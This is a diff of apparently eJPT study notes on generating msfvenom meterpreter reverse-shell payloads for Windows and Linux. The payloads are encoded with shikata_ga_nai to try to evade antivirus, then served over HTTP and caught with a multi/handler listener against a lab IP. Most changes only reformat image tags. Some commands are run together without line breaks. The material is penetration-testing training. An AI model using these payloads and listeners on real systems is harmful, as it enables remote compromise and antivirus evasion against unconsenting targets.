@@ -102,17 +102,25 @@ msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -e 
 * The payload can be encoded as often as desired by increasing the number of iterations.
 * The more iterations, the better chances to bypass an Antivirus. Use **`-i`** option.
 
-msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f exe > /home/kali/certs/ejpt/Windows\_Payloads/encodedx86.exe![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9c008a977f1b16aded3166fa2f353eba24310ff4%2Fimage-20230415213941131.png?alt=media)
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f exe > /home/kali/certs/ejpt/Windows\_Payloads/encodedx86.exe
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9c008a977f1b16aded3166fa2f353eba24310ff4%2Fimage-20230415213941131.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 ### **Linux Payload**
 
-msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f elf > /home/kali/certs/ejpt/Linux\_Payloads/encodedx86![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e2cc12efa4f115212a607b3c46a2996a9eedb3bc%2Fimage-20230415213215234.png?alt=media)msfvenom shikata\_ga\_nai Linux
+msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f elf > /home/kali/certs/ejpt/Linux\_Payloads/encodedx86msfvenom shikata\_ga\_nai Linux
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e2cc12efa4f115212a607b3c46a2996a9eedb3bc%2Fimage-20230415213215234.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 * Test each of the above generated payloads, like before
 
-cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfconsole -q​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-272cfba18c7588efaa8b7563881176e593a4fd82%2Fimage-20230415213745031.png?alt=media)
+cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfconsole -q​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run
 
-> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:​![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-0a77cc42fa547ba68f55942bb166da905d8fe024%2Fimage-20230415214414552.png?alt=media)​
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-272cfba18c7588efaa8b7563881176e593a4fd82%2Fimage-20230415213745031.png?alt=media" alt=""><figcaption></figcaption></figure>
+
+> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:​​
+
+<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-0a77cc42fa547ba68f55942bb166da905d8fe024%2Fimage-20230415214414552.png?alt=media" alt=""><figcaption></figcaption></figure>
 
 ### Injecting Payloads into PEs <a href="#injecting-payloads-into-pes" id="injecting-payloads-into-pes"></a>
 
